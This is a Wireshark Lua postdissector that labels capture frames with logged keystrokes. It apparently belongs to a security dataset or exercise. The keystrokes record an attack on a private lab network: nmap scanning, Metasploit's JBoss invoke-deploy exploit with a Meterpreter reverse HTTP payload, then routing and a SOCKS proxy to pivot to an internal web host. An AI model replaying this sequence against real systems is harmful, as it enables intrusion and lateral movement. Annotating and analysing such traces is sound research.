-- keypresses frame number-based postdissector
-- declare Fields to be read
-- declare our (pseudo) protocol
keypresses_proto = Proto("keypresses","keypresses Log")
-- create the fields for our "protocol"
timestamp_F = ProtoField.string("keypresses.timestamp","Original Event Timestamp")
eventdata_F = ProtoField.string("keypresses.data","Data")

-- add the field to the protocol
keypresses_proto.fields = {timestamp_F, eventdata_F}

-- create a function to "postdissect" each frame
function keypresses_proto.dissector(buffer,pinfo,tree)
    -- add the data based on timestamps
    if pinfo.abs_ts >= 1508953302.0 and pinfo.abs_ts <= 1508953304.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("ifconfig eth0 10.0.0.2/24 up[Return]nmap 10.0.0.0-255[Return]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:41:42"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953320.0 and pinfo.abs_ts <= 1508953322.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("route add default gw 10.0.0.1[Return][Super_L]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:42:00"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953330.0 and pinfo.abs_ts <= 1508953332.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("http[Shift_L]://")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:42:10"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953335.0 and pinfo.abs_ts <= 1508953337.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("10.0.4.3[Return]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:42:15"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953342.0 and pinfo.abs_ts <= 1508953344.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("[Alt_L][Tab]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:42:22"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953367.0 and pinfo.abs_ts <= 1508953369.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("man nmap[Return][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down][Down]qnmap 10.0.0-4.0-255 -p 80,80[Return]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:42:47"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953393.0 and pinfo.abs_ts <= 1508953395.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("[Alt_L][Tab]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:43:13"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953409.0 and pinfo.abs_ts <= 1508953411.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("http[Shift_L]://10.0.2.2[Shift_L]:8080/[Return][Alt_L][Tab]msfconsole[Return]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:43:29"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953437.0 and pinfo.abs_ts <= 1508953439.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("search jboss[Return]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:43:57"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953484.0 and pinfo.abs_ts <= 1508953486.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("use auxiliary/scanner/http/jboss[Shift_L]_vulnscan[Return]show options[Return]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:44:44"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953502.0 and pinfo.abs_ts <= 1508953504.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("set [Shift_L]RHOSTS 10.0.2.2[Return]set [Shift_L]RPORT 8080[Return]run[Return]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:45:02"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953510.0 and pinfo.abs_ts <= 1508953512.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("search jboss[Return]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:45:10"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953598.0 and pinfo.abs_ts <= 1508953600.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("use exploit/multi/http/jboss[Shift_L]_invoke[Shift_L]_deploy[Return]show options[Return]set [Shift_L]RHOST 10.0.2.2[Return]set payload java/meterpreter/reverse[Shift_L]_http[Return]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:46:38"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953617.0 and pinfo.abs_ts <= 1508953619.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("set [Shift_L]LPORT 1081[Return]set [Shift_L]LHOST 10.0.0.2[Return]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:46:57"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953623.0 and pinfo.abs_ts <= 1508953625.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("exploit[Return]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:47:03"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953646.0 and pinfo.abs_ts <= 1508953648.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("background[Return]sessions[Return]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:47:26"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953671.0 and pinfo.abs_ts <= 1508953673.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("route add 10.0.4.0 255.255.255.0 1[Return]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:47:51"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953683.0 and pinfo.abs_ts <= 1508953685.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("use auxiliary/server")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:48:03"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953691.0 and pinfo.abs_ts <= 1508953693.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("/socks4a[Return]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:48:11"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953698.0 and pinfo.abs_ts <= 1508953700.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("show options[Return]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:48:18"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953702.0 and pinfo.abs_ts <= 1508953704.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("run[Return]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:48:22"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953705.0 and pinfo.abs_ts <= 1508953707.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("[Alt_L][Tab]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:48:25"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953730.0 and pinfo.abs_ts <= 1508953732.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("10.0.0.2[Tab]1080")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:48:50"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953742.0 and pinfo.abs_ts <= 1508953744.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("http[Shift_L]://10.0.4.3[Return]")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:49:02"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
    if pinfo.abs_ts >= 1508953768.0 and pinfo.abs_ts <= 1508953770.0 then
       local subtree = tree:add(keypresses_proto,"keypresses Log")
       local mycomplientstr = tostring("10.0.4.3[Tab]1080[Tab][Shift_L]MM[Tab][Shift_L]Found p[BackSpace]non-public facgin[BackSpace][BackSpace][BackSpace]ing webate[BackSpace][BackSpace][BackSpace]sit")

       subtree:add(tostring("Original Timestamp: "),tostring("2017-10-25T17:49:28"))
       subtree:add(tostring("Log Data: "), mycomplientstr)
    end
end
-- register our protocol as a postdissector
register_postdissector(keypresses_proto)